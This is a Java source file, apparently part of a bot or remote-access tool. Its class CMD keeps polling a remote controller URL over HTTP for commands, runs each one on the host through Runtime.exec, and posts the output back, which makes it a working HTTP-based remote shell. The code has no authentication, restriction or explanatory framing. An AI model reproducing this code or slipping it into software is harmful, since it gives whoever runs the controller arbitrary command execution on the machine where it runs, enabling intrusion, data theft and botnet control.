package com.bot.Thread;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

public class CMD extends Thread {
  protected String proxyUrl;
  protected String sessionId;

  public void startSend(String proxyUrl, String sessionId) {
    this.proxyUrl = proxyUrl;
    this.sessionId = sessionId;
    start();
  }

  public void run() {
    while (!Thread.currentThread().isInterrupted()) {
      CloseableHttpClient client = HttpClientBuilder.create().build();
      HttpGet get = new HttpGet(this.proxyUrl.concat("/socketHandler"));
      get.addHeader("sockRestId", sessionId);
      try {
        HttpResponse response = client.execute(get);
        if (response.getStatusLine().getStatusCode() != 200) {
          throw new Exception("status not 200");
        }
        if (response.getEntity() == null) {
          get.releaseConnection();
          client.close();
          Thread.sleep(LinkAbstract.delay);
          continue;
        }
        String command = EntityUtils.toString(response.getEntity());
        if (command.equals("")) {
          get.releaseConnection();
          client.close();
          Thread.sleep(LinkAbstract.delay);
          continue;
        }
        if (command.equals("#exit")) {
          throw new Exception("#exit");
        }
        executeCommandAndResp(command, sessionId);
        get.releaseConnection();
        client.close();
      } catch (Exception e) {
        disconnectRemoteSocket(sessionId);
        break;
      }
    }
  }

  private void executeCommandAndResp(String command, String sessionId) {
    CloseableHttpClient client = HttpClientBuilder.create().build();
    HttpPost post = new HttpPost(proxyUrl.concat("/socketHandler"));
    post.addHeader("sockRestId", sessionId);
    try {
      post.setEntity(new StringEntity(executeCommand(command)));
      client.execute(post);
    } catch (Exception e) {
    }
  }

  public static String executeCommand(String command) {
    StringBuffer output = new StringBuffer();
    Process p;
    try {
      p = Runtime.getRuntime().exec(command);
      p.waitFor();
      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line = "";
      while ((line = reader.readLine()) != null) {
        output.append(line + "\n");
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    return output.toString();
  }

  private void disconnectRemoteSocket(String sockRestId) {
    HttpClient client = HttpClientBuilder.create().build();
    HttpPost post = new HttpPost(proxyUrl.concat("/socketControl/disconnect"));
    try {
      HttpResponse response;
      int ctry = 5;
      do {
        post.setHeader("sessionId", sockRestId);
        response = client.execute(post);
        ctry--;
        if (ctry == 0) {
          throw new Exception("out of retry");
        }
      } while (response.getStatusLine().getStatusCode() != 200);
    } catch (Exception e) {
    }
  }
}
